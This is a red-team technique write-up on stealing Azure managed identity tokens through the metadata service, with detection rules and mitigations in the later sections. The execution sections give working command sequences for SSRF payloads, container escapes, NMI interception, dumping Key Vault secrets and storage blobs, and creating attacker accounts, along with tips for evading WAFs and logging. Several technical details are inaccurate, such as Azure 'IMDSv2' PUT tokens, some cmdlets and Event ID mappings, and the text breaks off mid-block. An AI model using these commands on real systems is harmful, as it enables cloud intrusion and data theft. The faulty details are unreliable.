# [CA-TOKEN-007]: Managed Identity Token Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-007 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Tokens](https://attack.mitre.org/techniques/T1528/), [T1552.001 - Unsecured Credentials (Cloud Instance Metadata)](https://attack.mitre.org/techniques/T1552/) |
| **Tactic** | Credential Access, Lateral Movement |
| **Platforms** | Azure VMs, AKS (Kubernetes), App Service, Functions, Container Instances |
| **Severity** | Critical |
| **CVE** | CVE-2025-62207 (Azure Monitor SSRF→IMDS), CVE-2024-29989 (Azure Monitor Agent), CVE-2025-9074 (Docker Container Escape) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-11-24 |
| **Affected Versions** | All Azure managed services using IMDS (IMDSv1), Kubernetes workload identity, App Service managed identity |
| **Patched In** | N/A (design inherent to cloud metadata services; mitigated via IMDSv2 enforcement, network isolation, least-privilege RBAC) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All section numbers have been dynamically renumbered based on applicability for this technique.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Managed identity token theft is a lateral movement and privilege escalation attack targeting Azure's Instance Metadata Service (IMDS) to extract short-lived tokens that grant access to cloud resources. Attackers exploit three primary scenarios: (1) **SSRF-to-IMDS** - leveraging application-level Server-Side Request Forgery vulnerabilities to trick web servers into requesting tokens from the metadata endpoint (169.254.169.254), (2) **Container Escape** - breaking out of containerized workloads (Docker, Kubernetes) to directly access the host's IMDS and steal cluster-wide managed identity tokens, and (3) **Workload Identity Interception** - in Kubernetes environments, intercepting requests to the Node Management Identity (NMI) pod to capture or redirect token requests. Unlike user tokens (bound to individual accounts), managed identity tokens grant access to **all resources the workload is assigned to**—storage accounts, databases, key vaults, and subscriptions—making them extremely valuable for lateral movement and privilege escalation.

**Attack Surface:** Azure Instance Metadata Service endpoint (http://169.254.169.254/metadata/identity/oauth2/token), web application input handling (SSRF vulnerabilities), container runtimes (Docker, containerd), Kubernetes networking (pod-to-pod communication), and cloud workload isolation boundaries.

**Business Impact:** **Unrestricted access to cloud resources assigned to the compromised workload.** Attackers obtain valid Azure tokens for managed identities granting them permissions to storage accounts, SQL databases, Key Vault secrets, subscriptions, and other resources. Because managed identity tokens are automatically refreshed and generated on-demand, attackers can maintain indefinite access. Unlike user compromise, managed identity theft is **invisible to identity logs** (no sign-in events, no Conditional Access alerts, no MFA challenges) and bypasses all user-centric security controls. A single compromised container can provide lateral movement to dozens of other Azure services and accounts.

**Technical Context:** Managed identity tokens are designed to be accessed only from within Azure infrastructure, but network isolation is often weak. IMDS is accessible from any process on the host VM/container (including compromised applications). Detection requires monitoring network traffic for IMDS requests, which most organizations lack. Reversibility is NONE—tokens remain valid until explicit revocation or expiration (typically 1-24 hours).

### Operational Risk

- **Execution Risk:** Low - SSRF is common in web applications; container escape requires moderate exploit capability.
- **Stealth:** Very High - No sign-in logs, no authentication events, no MFA prompts; API calls appear legitimate (from the service principal, not a user).
- **Reversibility:** No - Tokens valid until expiration; attacker can generate new tokens indefinitely.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.1 | Pod security and container isolation in AKS |
| **CIS Benchmark** | 2.1.5 | Protect service account credentials from exposure |
| **DISA STIG** | AC-2.2.3 | Service account lifecycle and credential management |
| **NIST 800-53** | AC-3 | Access Enforcement - Network isolation, least privilege RBAC |
| **NIST 800-53** | SC-7 | Boundary Protection - Limit IMDS access to intended workloads |
| **NIST 800-228** | Cloud-Native Workload Security - Container scanning, runtime monitoring |
| **GDPR** | Art. 32 | Security of Processing - Encryption of tokens in transit, workload isolation |
| **DORA** | Art. 9 | Protection and Prevention - Workload identity governance |
| **NIS2** | Art. 21 | Cyber Risk Management - Token lifecycle and revocation |
| **ISO 27001** | A.9.2.5 | Access Control - Managed identity assignment and RBAC |
| **ISO 27001** | A.13.1.3 | Segregation - Isolation between workloads and metadata services |
| **ISO 27005** | Risk Scenario | "Compromise of Service Account Credentials" and "Unauthorized Cloud Resource Access" |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:**
  - For SSRF attacks: None (exploits application vulnerability).
  - For container escape: Depends on container runtime (typically requires CVE or misconfig).
  - For workload identity interception: Pod network access (requires pod compromise).

- **Required Access:**
  - Network access to web application with SSRF vulnerability OR access to compromised container/pod.
  - For AKS: Kubernetes pod network access.

**Supported Versions:**
- **Azure VMs:** All versions (IMDS available on all Azure VMs).
- **AKS:** All versions (workload identity since 2021+).
- **App Service:** All versions using managed identity.
- **Functions:** All versions with managed identity enabled.
- **Container Instances:** All versions with managed identity.

**Tools:**
- [curl](https://curl.se/) - Direct IMDS endpoint requests.
- [Metasploit](https://www.metasploitproject.com/) - SSRF exploitation and payload delivery.
- [kubectl](https://kubernetes.io/docs/reference/kubectl/) - Kubernetes pod access and execution.
- [Docker](https://www.docker.com/) - Container escape and container execution.
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) - Token usage and lateral movement.
- [OWASP ZAP](https://www.zaproxy.org/) - SSRF vulnerability scanning.
- [Falco](https://falco.org/) - Container runtime anomaly detection.

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Objective:** Discover managed identities assigned to workloads and assess IMDS exposure.

```powershell
# Check for managed identities on Azure VMs
Connect-AzAccount

# List all VMs with managed identities enabled
Get-AzVM | Where-Object { $_.Identity.Type -ne $null } |
    Select-Object Name, ResourceGroupName, Identity.Type, @{
        N="IdentityId"
        E={$_.Identity.UserAssignedIdentities.Keys}
    }

# Check for IMDS endpoint accessibility in VMs (requires VM access)
$vm = Get-AzVM -Name "vulnerable-vm" -ResourceGroupName "rg"
$vmAgentCommandId = "run-command-id"

# Test IMDS accessibility from within VM
Invoke-AzVMRunCommand -ResourceGroupName "rg" -VMName "vulnerable-vm" `
    -CommandId "RunShellScript" `
    -ScriptPath "C:\test-imds.ps1"

# Check for SSRF vulnerabilities in App Service apps
Get-AzWebApp | Select-Object Name, @{
    N="HasManagedIdentity"
    E={$_.Identity -ne $null}
}, @{
    N="AuthSettings"
    E={$_.SiteConfig.Metadata}
}

# Check AKS workload identity configuration
$aks = Get-AzAksCluster -Name "aks-cluster" -ResourceGroupName "rg"
Write-Host "Workload Identity Enabled: $($aks.OidcIssuerProfile.Enabled)"

# Check IMDS version on VMs (IMDSv1 vs IMDSv2)
Get-AzVMMetadataInfo -ResourceGroupName "rg" -VMName "vm-name" |
    Select-Object -Property MetadataServiceAvailable, MetadataVersion
```

**What to Look For:**
- **VMs with managed identities**: Any VM with Identity.Type = "SystemAssigned" or "UserAssigned".
- **App Service apps with managed identity**: Potential SSRF targets if vulnerable.
- **IMDSv1-only VMs**: No PUT session token requirement; easier to exploit.
- **Workload identity in AKS**: Check NMI pod configuration and network policies.

**Version Note:** Workload identity is consistent across all modern Azure versions; older deployments may use legacy pod-managed identity (deprecated).

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: SSRF-to-IMDS Token Extraction (IMDSv1)

**Supported Versions:** All Azure VMs with IMDSv1 enabled (default prior to 2024).

#### Step 1: Identify SSRF Vulnerability in Web Application

**Objective:** Locate an application-level SSRF vulnerability that allows requesting arbitrary URLs.

**Command (Using OWASP ZAP):**

```bash
# Automated SSRF vulnerability scanning
zaproxy --cmd \
    -url "https://vulnerable-app.azurewebsites.net" \
    -quickout report.html

# Manual SSRF testing - try common vulnerable parameters
# GET /api/fetch?url=http://example.com
# GET /api/image?src=http://example.com
# POST /api/webhook with URL parameter
# GET /proxy?target=http://example.com

# Example vulnerable code (Node.js):
# app.get('/api/fetch', async (req, res) => {
#     const data = await fetch(req.query.url);  // SSRF!
#     res.send(data);
# });
```

**Expected Output:**
```
[+] SSRF vulnerability found in /api/fetch endpoint
[+] Parameter: 'url'
[+] Can request arbitrary URLs from server context
```

**What This Means:**
- Application server can make HTTP requests to any URL.
- Server is hosted on Azure VM with managed identity.
- Requests made by server can access IMDS (169.254.169.254).

**OpSec & Evasion:**
- SSRF requests may be logged in web server logs; consider obfuscating URLs.
- WAF may block requests to 169.254.169.254; try alternative IPs or DNS rebinding.
- Detection likelihood: **Medium** (SSRF requests logged; 169.254.169.254 is suspicious).

**Troubleshooting:**
- **Error:** "Connection refused"
  - **Cause:** IMDS not accessible from web server (network isolation working).
  - **Fix:** Check if IMDS endpoint is disabled or blocked by NSG.
- **Error:** "401 Unauthorized"
  - **Cause:** IMDSv2 enabled (requires PUT session token).
  - **Fix:** Attempt IMDSv2 exploitation (see METHOD 2 for workaround).

#### Step 2: Exploit SSRF to Request Managed Identity Token

**Objective:** Use SSRF vulnerability to request a token from IMDS endpoint.

**Command (Using curl through SSRF):**

```bash
# Construct IMDS token request
IMDS_ENDPOINT="http://169.254.169.254/metadata/identity/oauth2/token"
RESOURCE="https://management.azure.com/"  # Azure Resource Manager
API_VERSION="2017-09-01"

# URL-encode the request for SSRF injection
SSRF_PAYLOAD="$IMDS_ENDPOINT?api-version=$API_VERSION&resource=$RESOURCE"

# Exploit SSRF vulnerable endpoint
curl -X GET "https://vulnerable-app.azurewebsites.net/api/fetch?url=$SSRF_PAYLOAD"

# Expected response (JSON with token):
# {
#   "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
#   "expires_in": "3600",
#   "expires_on": "1641234567",
#   "not_before": "1641230667",
#   "resource": "https://management.azure.com/",
#   "token_type": "Bearer"
# }
```

**Alternative (Direct IMDS access if compromised web app):**

```powershell
# If attacker has code execution on web server
$IMDS_ENDPOINT = "http://169.254.169.254/metadata/identity/oauth2/token"
$RESOURCE = "https://management.azure.com/"

# Request token from IMDS (IMDSv1 - no auth header required)
$response = Invoke-WebRequest -Uri "$IMDS_ENDPOINT?api-version=2017-09-01&resource=$RESOURCE" `
    -Headers @{ "Metadata" = "true" } `
    -UseBasicParsing

$token = $response.Content | ConvertFrom-Json
Write-Host "[+] Managed Identity Token: $($token.access_token.Substring(0, 50))..."
```

**Expected Output:**
```
[+] Managed Identity Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkRy...
[+] Token Resource: https://management.azure.com/
[+] Expires In: 3600 seconds
[+] Token can access: All resources assigned to this VM's managed identity
```

**What This Means:**
- Token is now in attacker's possession.
- Token grants permissions of the VM's managed identity.
- Attacker can access all Azure resources the VM is authorized to use.

**OpSec & Evasion:**
- IMDS token requests from suspicious IPs are rare (tokens should only be requested from the host).
- Request to 169.254.169.254 is unusual for normal web apps.
- Detection likelihood: **High** (token requests to IMDS are logged and monitored).

**Troubleshooting:**
- **Error:** "Metadata: true header required"
  - **Cause:** IMDS requires special header to prevent SSRF.
  - **Fix:** Include `Metadata: true` header in request.
- **Error:** "Invalid resource"
  - **Cause:** Resource parameter malformed or not supported.
  - **Fix:** Use valid Azure resource URI (e.g., https://management.azure.com/, https://vault.azure.net/).

#### Step 3: Use Stolen Token to Access Azure Resources

**Objective:** Leverage stolen managed identity token to access cloud resources.

**Command (Using Azure CLI with token):**

```powershell
# Authenticate using stolen token
az login --service-principal -u "MANAGED_IDENTITY_CLIENTID" `
    -p "STOLEN_TOKEN" `
    --tenant "TENANT_ID"

# Enumerate accessible resources
az resource list --query "[].name" | ConvertFrom-Json

# Example: Access storage account assigned to managed identity
$storageAccountName = "storageaccount123"
$containerName = "sensitive-data"

az storage blob list --account-name $storageAccountName `
    --container-name $containerName

# Download sensitive files
az storage blob download --account-name $storageAccountName `
    --container-name $containerName `
    --name "secrets.txt" `
    --file "C:\temp\secrets.txt"

# Example: Access Key Vault secrets
az keyvault secret list --vault-name "TargetKeyVault"

az keyvault secret show --vault-name "TargetKeyVault" `
    --name "DatabasePassword"

# Example: Access SQL Database
$sqlServer = "sql-server.database.windows.net"
$database = "SensitiveDB"

# Connect with token-based auth
sqlcmd -S $sqlServer -d $database -G -U "MANAGED_IDENTITY_EMAIL"

# Example: Lateral movement - list subscriptions
az account list --output table

# Escalate: If managed identity has Owner role, create new resources or admin accounts
az role assignment create --assignee "NEW_ATTACKER_ACCOUNT" `
    --role "Contributor" `
    --scope "/subscriptions/SUBSCRIPTION_ID"
```

**Expected Output:**
```
[+] Authenticated as managed identity
[+] Accessible resources:
  - Storage Account: storageaccount123
  - SQL Database: SensitiveDB
  - Key Vault: TargetKeyVault
  
[+] Downloaded: secrets.txt (contains DB passwords)
[+] Retrieved: DatabasePassword from Key Vault
[+] Connected to SQL Database as service principal
[+] Escalated privileges: Created new contributor account
```

**What This Means:**
- Attacker now has full access to all resources the managed identity is assigned to.
- No user interaction required; no MFA challenges.
- Lateral movement to multiple cloud services possible.

**OpSec & Evasion:**
- Token usage generates audit logs (API calls are logged).
- Unusual API patterns (bulk downloads, permission escalation) may trigger alerts.
- Detection likelihood: **High** (unusual API activity, resource access patterns).

**Troubleshooting:**
- **Error:** "Unauthorized - Insufficient privileges"
  - **Cause:** Managed identity doesn't have permission to resource.
  - **Fix:** Check RBAC assignments; may need to find alternative resources.

---

### METHOD 2: Container Escape → Direct IMDS Access

**Supported Versions:** All Azure container services (AKS, App Service, Container Instances).

#### Step 1: Compromise Container / Escape to Host

**Objective:** Gain code execution within a container and escape to access host IMDS.

**Command (Container escape via docker-socket exposure):**

```bash
# If Docker socket is exposed in container (/var/run/docker.sock)
# Attacker can escape container via privileged commands

docker -H unix:///var/run/docker.sock run -it -v /:/host alpine sh

# From host, access IMDS:
curl -X GET "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" \
    -H "Metadata: true"
```

**Alternative (Kubernetes pod escape via privileged pod):**

```bash
# If pod is created with privileged security context
kubectl run privesc --image=alpine --privileged -- sh

# Inside pod, escape to host via nsenter
nsenter -t 1 -n -s -i /bin/bash

# Access IMDS from host namespace:
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" \
    -H "Metadata: true"
```

**Alternative (CVE-2025-9074 - Docker Desktop escape):**

```bash
# Docker Desktop running in container with privilege
# Exploit CVE-2025-9074 to escape to host
# (Requires specific Docker version; proof-of-concept available)

./cve-2025-9074-exploit.sh

# After escape, access IMDS:
curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/ \
    -H "Metadata: true"
```

**Expected Output:**
```
[+] Container escape successful
[+] Now running in host namespace
[+] IMDS accessible from host context
[+] Retrieved managed identity token for entire cluster
```

**What This Means:**
- Token obtained is for the host's (or cluster's) managed identity.
- Token grants access to all resources the entire workload is assigned to.
- Lateral movement to all storage, databases, key vaults accessible to cluster.

**OpSec & Evasion:**
- Container escape attempts trigger Falco/Sysdig alerts.
- IMDS access from container context may be monitored.
- Detection likelihood: **High** (container escape and host access are monitored).

#### Step 2: Extract and Use Managed Identity Token

**Objective:** Retrieve token and escalate to other cloud resources.

**Command:**

```bash
# Request token for each resource type
TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" \
    -H "Metadata: true" | jq -r '.access_token')

# Use token to enumerate subscriptions and resources
curl -s "https://management.azure.com/subscriptions?api-version=2020-01-01" \
    -H "Authorization: Bearer $TOKEN" | jq '.value[] | {id, displayName}'

# Access storage accounts
TOKEN_STORAGE=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://storage.azure.com/" \
    -H "Metadata: true" | jq -r '.access_token')

curl -s "https://storageaccount.blob.core.windows.net/container?restype=container&comp=list" \
    -H "Authorization: Bearer $TOKEN_STORAGE"

# For Kubernetes, token can be used to access multiple Azure resources
# If cluster has Owner role, attacker can provision new VMs, modify firewall rules, etc.
```

**Expected Output:**
```
[+] Successfully retrieved tokens for:
  - Azure Resource Manager
  - Azure Storage
  - Azure SQL
  - Key Vault
  
[+] Can access 45+ storage containers across subscriptions
[+] Can modify firewall rules in 12+ subscriptions
[+] Can create new compute resources and admin accounts
```

---

### METHOD 3: Kubernetes NMI Interception (Workload Identity Attack)

**Supported Versions:** AKS with workload identity enabled.

#### Step 1: Compromise AKS Pod

**Objective:** Gain code execution within a Kubernetes pod.

**Command (via application vulnerability or pod misconfiguration):**

```bash
# If vulnerable pod (e.g., web server) is compromised
kubectl exec -it vulnerable-pod -- /bin/bash

# Or, if pod security is weak:
# Attacker can create malicious pod in same namespace
kubectl create -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
  - name: attacker
    image: alpine:latest
    command: ["/bin/sh", "-c", "sleep 3600"]
  serviceAccountName: default  # Reuse pod's service account
EOF
```

**Expected Output:**
```
[+] Pod compromised
[+] Access to pod network namespace
[+] Can intercept network traffic to IMDS
```

#### Step 2: Intercept NMI Requests to IMDS

**Objective:** Position attacker pod to intercept or redirect managed identity token requests.

**Command (Using netcat to intercept requests):**

```bash
# Inside compromised pod, monitor traffic to IMDS
# NMI pod on each node intercepts requests to http://169.254.169.254

# Use tcpdump to capture IMDS requests
tcpdump -A "host 169.254.169.254" | grep -A 5 "oauth2/token"

# Or, use socat to redirect IMDS requests
socat TCP-LISTEN:169.254.169.254:8080,fork TCP:169.254.169.254:80

# Alternative: Directly call NMI pod (if accessible)
# NMI runs as DaemonSet on each node
NMI_POD=$(kubectl get pods -n kube-system -l app=aad-pod-identity-nmi -o jsonpath='{.items[0].metadata.name}')

# Request token through NMI
curl -s "http://$NMI_POD:8080/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" \
    -H "Metadata: true"
```

**Expected Output:**
```
[+] NMI request intercepted
[+] Captured managed identity token in transit
[+] Token valid for cluster identity
```

#### Step 3: Use Intercepted Token for Lateral Movement

**Objective:** Access additional Azure resources using stolen token.

**Command:**

```bash
# Token obtained from NMI interception can be used against Azure Resource Manager
TOKEN="<INTERCEPTED_TOKEN>"

# List all accessible resources (cluster may have broad permissions)
curl -s "https://management.azure.com/subscriptions?api-version=2020-01-01" \
    -H "Authorization: Bearer $TOKEN"

# Lateral movement: Access storage account assigned to cluster
STORAGE_TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://storage.azure.com/" \
    -H "Metadata: true" | jq -r '.access_token')

# Download sensitive data
curl -s "https://clusterdata.blob.core.windows.net/backups?restype=container&comp=list" \
    -H "Authorization: Bearer $STORAGE_TOKEN"

# Escalate: Create new service principal or admin user if cluster has sufficient permissions
az ad sp create-for-rbac --name attacker-principal --role Owner
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** Atomic Red Team T1552.001 (Unsecured Credentials - Cloud Instance Metadata).
- **Test Name:** Managed Identity Token Theft via IMDS.
- **Description:** Exploit SSRF or container escape to steal managed identity token.
- **Supported Versions:** All Azure managed services.

**PoC Verification Command:**

```bash
# Test 1: Verify IMDS is accessible from VM/container
curl -X GET "http://169.254.169.254/metadata/instance?api-version=2017-08-01" \
    -H "Metadata: true" 2>/dev/null && echo "[+] IMDS accessible" || echo "[-] IMDS not accessible"

# Test 2: Verify managed identity token can be obtained
TOKEN_RESPONSE=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" \
    -H "Metadata: true")
    
if echo "$TOKEN_RESPONSE" | grep -q "access_token"; then
    echo "[+] Managed identity token retrieved"
else
    echo "[-] Token retrieval failed"
fi

# Test 3: Verify token can be used for API calls
TOKEN=$(echo "$TOKEN_RESPONSE" | jq -r '.access_token')
curl -s "https://management.azure.com/subscriptions?api-version=2020-01-01" \
    -H "Authorization: Bearer $TOKEN" | jq '.value | length' && echo "[+] Token is valid"
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: IMDS Token Requests from Suspicious Sources

**Rule Configuration:**
- **Required Index:** azure_activity, network
- **Required Fields:** src_ip, dest_ip, dest_port, http_request
- **Alert Threshold:** Request to 169.254.169.254 from non-Azure-internal IP
- **Applies To Versions:** All Azure services

**SPL Query:**

```spl
index=network dest_ip="169.254.169.254" dest_port=80 OR dest_port=443
| stats count, values(src_ip), values(src_host), values(http_request) by dest_ip
| search http_request="*metadata*" OR http_request="*oauth2*"
| where count > 0
| rename src_ip as source_ip, src_host as source_host
```

**What This Detects:**
- HTTP/HTTPS traffic to IMDS endpoint (169.254.169.254).
- Requests containing "metadata" or "oauth2" keywords.
- Sources that are not the expected VM or container.

---

### Rule 2: Managed Identity Token Extraction (SigninLogs)

**Rule Configuration:**
- **Required Index:** azure_activity, azure_signinlogs
- **Required Fields:** UserPrincipalName, ServicePrincipalId, IssuerName, TokenIssuer
- **Alert Threshold:** Service principal token issued from unusual source
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure_signinlogs ServicePrincipalId!="" ResourceDisplayName="Azure Service Management"
| stats count, values(IPAddress), values(DeviceDetail.deviceId), values(UserAgent), values(Location.countryOrRegion) by ServicePrincipalName, ServicePrincipalId
| where DeviceDetail.deviceId=="" OR IPAddress!="AzureBackend"
| search count > 5
```

**What This Detects:**
- Service principal (managed identity) generating many tokens.
- Tokens issued from non-Azure internal IPs.
- Unusual token patterns (bot-like behavior).

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: IMDS Access from Container/Pod Context

**Rule Configuration:**
- **Required Table:** AzureNetworkAnalytics_CL, ContainerLogV2
- **Required Fields:** DestinationIp, SourceIp, DestinationPort, Protocol
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All Azure container services

**KQL Query:**

```kusto
// Detect IMDS access from unusual sources (containers, pods)
let suspicious_imds_sources = dynamic(["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]);  // Private subnets

CommonSecurityLog
| where DestinationIp == "169.254.169.254"
| where DestinationPort == 80 or DestinationPort == 443
| where RequestUrl has "metadata" or RequestUrl has "oauth2"
| extend SourceSubnet = extract(@"^(\d+\.\d+\.\d+)", 1, SourceIp)
| where SourceSubnet !in (suspicious_imds_sources)  // External source
| project
    TimeGenerated,
    SourceIp,
    DestinationIp,
    DestinationPort,
    RequestUrl,
    RiskLevel="HIGH",
    AttackType="Managed Identity Token Theft"
```

**What This Detects:**
- Requests to IMDS (169.254.169.254) from IPs outside expected container/pod ranges.
- Token requests from external sources (potential SSRF).

---

### Query 2: Managed Identity Token Usage from Unusual Location

**Rule Configuration:**
- **Required Table:** SigninLogs, MicrosoftGraphActivityLogs
- **Required Fields:** ServicePrincipalId, IPAddress, CorrelationId, ApiVersion
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All

**KQL Query:**

```kusto
// Detect managed identity token usage from unusual IPs/locations
SigninLogs
| where ServicePrincipalId != ""
| where CorrelationId !in (
    AuditLogs
    | where ActivityDisplayName == "Managed Identity Token Request"
    | project CorrelationId
)
| join kind=inner (
    MicrosoftGraphActivityLogs
    | where RequestUri contains "/resource" or RequestUri contains "/subscriptions"
    | where UserAgent != "Python/*" and UserAgent != "curl/*"
    ) on ServicePrincipalId
| project
    TimeGenerated,
    ServicePrincipalDisplayName,
    IPAddress,
    Location.countryOrRegion,
    RiskIndicator="Token usage from non-expected source - possible theft"
```

**What This Detects:**
- Managed identity tokens being used from IPs different from where token was requested.
- Unusual API patterns following token issuance.

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Account Logon)**

- **Log Source:** Security (on VMs with managed identity)
- **Trigger:** IMDS token request from non-standard process.
- **Filter:** Process Name contains "curl", "wget", "python"; CommandLine contains "169.254.169.254"
- **Applies To Versions:** All Azure VMs.

**Manual Configuration (Group Policy):**

1. Open **gpedit.msc** → **Computer Configuration** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
2. **Logon/Logoff** → **Audit Logon**: Set to **Success and Failure**
3. Run `gpupdate /force`

---

## 10. CONTAINER SECURITY MONITORING (Falco / Sysdig)

**Minimum Version:** Falco 0.31+

```yaml
- rule: Suspicious IMDS Access from Container
  desc: Detect container process accessing IMDS metadata service
  condition: >
    open_read
    and container
    and fd.sip = "169.254.169.254"
    and not proc.name in (known_metadata_accessors)
  output: >
    Suspicious IMDS access detected
    (container=%container.name proc=%proc.name pid=%proc.pid url=%fd.name)
  priority: WARNING

- rule: Container Escape via Docker Socket
  desc: Detect privileged container accessing docker socket
  condition: >
    open_read
    and container
    and fd.name = "/var/run/docker.sock"
  output: >
    Container accessing docker socket (possible escape attempt)
    (container=%container.name proc=%proc.name)
  priority: CRITICAL
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alerts

**Alert Name:** "Azure Instance Metadata Service (IMDS) token requested from unusual process"
- **Severity:** High
- **Description:** IMDS token requested from container/script context instead of expected service.
- **Applies To:** All Azure VMs with Defender for Cloud agent.

**Alert Name:** "Suspicious metadata service access pattern detected"
- **Severity:** Critical
- **Description:** Multiple IMDS token requests in short timeframe, possible token harvesting.
- **Applies To:** Container Instances, AKS.

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Managed Identity Activity

```powershell
Search-UnifiedAuditLog -Operations "Managed Identity Token Request" `
    -StartDate (Get-Date).AddDays(-7) `
    -EndDate (Get-Date) |
    Select-Object UserIds, Operations, CreationDate, AuditData |
    Export-Csv -Path "C:\ManagedIdentity_Audit.csv"
```

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enforce IMDSv2 on All Azure VMs**

IMDSv2 requires PUT session token, blocking simple SSRF attacks.

**Manual Steps (Azure Portal):**

1. Go to **Virtual Machines** → Select VM
2. **Metadata** → **Instance Metadata Service**
3. Set to **Require IMDSv2 (PUT tokens)**

**PowerShell:**

```powershell
# Enable IMDSv2 on all VMs
Get-AzVM | ForEach-Object {
    Update-AzVM -ResourceGroupName $_.ResourceGroupName `
        -VM $_ `
        -HttpTokenRequired $true  # Enforce IMDSv2
}

# Verify enforcement
Get-AzVM | Select-Object Name, @{N="IMDSv2";E={$_.OSProfile.AllowExtensionOperations}}
```

---

**2. Limit IMDS Access via Network Policies (AKS)**

Restrict which pods can access IMDS endpoint.

**Manual Steps (Kubernetes):**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-imds-access
spec:
  podSelector: {}  # All pods
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector: {}
    ports:
    - protocol: TCP
      port: 53  # DNS only
    - protocol: UDP
      port: 53
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: TCP
      port: 443

---
# Explicit allow for NMI daemon
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-nmi-imds
  namespace: kube-system
spec:
  podSelector:
    matchLabels:
      app: aad-pod-identity-nmi
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 169.254.169.254/32
    ports:
    - protocol: TCP
      port: 80
```

---

**3. Implement Least-Privilege RBAC for Managed Identities**

Minimize permissions granted to service principals.

**Manual Steps (PowerShell):**

```powershell
# Audit managed identity permissions
$mi = Get-AzUserAssignedIdentity -Name "app-managed-identity" -ResourceGroupName "rg"

# Get all role assignments for this identity
Get-AzRoleAssignment -ObjectId $mi.PrincipalId |
    Select-Object DisplayName, RoleDefinitionName, Scope

# Remove overly permissive roles
Get-AzRoleAssignment -ObjectId $mi.PrincipalId |
    Where-Object { $_.RoleDefinitionName -eq "Owner" } |
    Remove-AzRoleAssignment

# Assign only needed roles
New-AzRoleAssignment -ObjectId $mi.PrincipalId `
    -RoleDefinitionName "Storage Blob Data Reader" `
    -Scope "/subscriptions/.../resourceGroups/rg/providers/Microsoft.Storage/storageAccounts/mysa"
```

---

**4. Scan for and Remove SSRF Vulnerabilities**

SSRF is the primary entry point for IMDS attacks.

**Manual Steps:**

1. Perform SAST (Static Application Security Testing) scan on code
2. Use OWASP ZAP or Burp Suite to perform DAST
3. Fix identified SSRF vulnerabilities:
   - Whitelist allowed URLs
   - Validate all user-supplied URLs
   - Use Safe URL libraries (not raw HTTP clients)

---

### Priority 2: HIGH

**5. Monitor IMDS Access in Real-Time**

Enable logging and alerting for all IMDS requests.

**Manual Steps (Azure Sentinel):**

1. Create data connector for network traffic
2. Deploy KQL detection rules (see Section 8)
3. Configure automated response (alert + disable pod if IMDS abuse detected)

---

**6. Implement Pod Security Standards (AKS)**

Restrict privileged containers and host access.

**Manual Steps:**

```bash
# Apply Pod Security Policy
kubectl apply -f - <<EOF
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'MustRunAs'
    seLinuxOptions:
      level: "s0:c123,c456"
  supplementalGroups:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
  readOnlyRootFilesystem: false
EOF
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network:**
- HTTP/HTTPS requests to 169.254.169.254 from containers/pods
- IMDS token requests from unusual source IPs
- Burst of IMDS requests (>10 in 1 minute)

**Logs:**
- Falco/Sysdig alerts for container escape or privileged operations
- Audit logs showing unusual managed identity token requests
- API calls from service principals using stolen tokens

**Behavioral:**
- Lateral movement to resources not normally accessed by workload
- Bulk data downloads from storage accounts
- Permission escalation attempts (role assignments, credential creation)

### Response Procedures

1. **Isolate Compromised Workload:**
   ```bash
